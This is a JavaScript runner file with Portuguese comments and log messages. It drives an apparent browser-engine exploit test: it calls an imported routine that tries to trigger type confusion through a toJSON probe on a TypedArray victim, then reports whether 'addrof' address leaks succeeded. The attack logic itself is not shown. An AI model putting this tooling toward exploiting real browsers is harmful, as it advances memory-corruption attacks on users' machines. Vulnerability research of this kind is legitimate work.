// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_ForceNumericLeak,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ForceNumericLeak";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (ForceNumericLeak) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_ForceNumericLeak(); 

    logS3(`   Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-FNLICD) ERR: ${result.errorOccurred.name}`;
         if (result.errorOccurred.name === 'TypeError' && result.errorOccurred.message.includes("circular structure")) {
             logS3(`     NOTA: TypeError de estrutura circular.`, "info");
        }
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da sonda onde C1 foi 'this' e confuso: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : "N/A (C1 não foi 'this' confuso ou erro)"}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugOnC1Confirmed = false;
        if (result.toJSON_details && 
            result.toJSON_details.this_is_C1_details_obj &&
            result.toJSON_details.this_type === "[object Object]") {
            heisenbugOnC1Confirmed = true;
        }

        let anyAddrofSuccess = false;
        if (result.addrof_A_result && result.addrof_A_result.success) {
             logS3(`     ADDROF A (Numeric Leak) SUCESSO! ${result.addrof_A_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_A_result) {
             logS3(`     ADDROF A (Numeric Leak) FALHOU: ${result.addrof_A_result.msg}`, "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result && result.addrof_B_result.success) {
             logS3(`     ADDROF B (Numeric Leak) SUCESSO! ${result.addrof_B_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_B_result) {
             logS3(`     ADDROF B (Numeric Leak) FALHOU: ${result.addrof_B_result.msg}`, "warn", FNAME_RUNNER);
        }

        if (result.toJSON_details && result.toJSON_details.error_in_probe) {
            logS3(`     ERRO INTERNO NA SONDA (C1 como 'this'): ${result.toJSON_details.error_in_probe}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-FNLICD) toJSON_ERR`;
        } else if (heisenbugOnC1Confirmed) {
            logS3(`     !!!! TYPE CONFUSION NO OBJETO C1_DETAILS (quando 'this') OBSERVADA !!!! Call #${result.toJSON_details.call_number}`, "critical", FNAME_RUNNER);
            if (result.toJSON_details.leaked_numeric_A_assigned_to_C1_this !== undefined) { 
                logS3(`       Valor numérico A atribuído a C1 ('this'): ${result.toJSON_details.leaked_numeric_A_assigned_to_C1_this}`, "info");
            }
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-FNLICD) C1_TC OK, Addr Fail`;
            } else { 
                 document.title = `Heisenbug (TypedArray-FNLICD) AddrFromNumeric SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-FNLICD) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (ForceNumericLeak) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ForceNumericLeak) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD)) {
        // Ajustar a lógica de título final
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("C1_TC OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD} Concluído`;
        }
    }
}
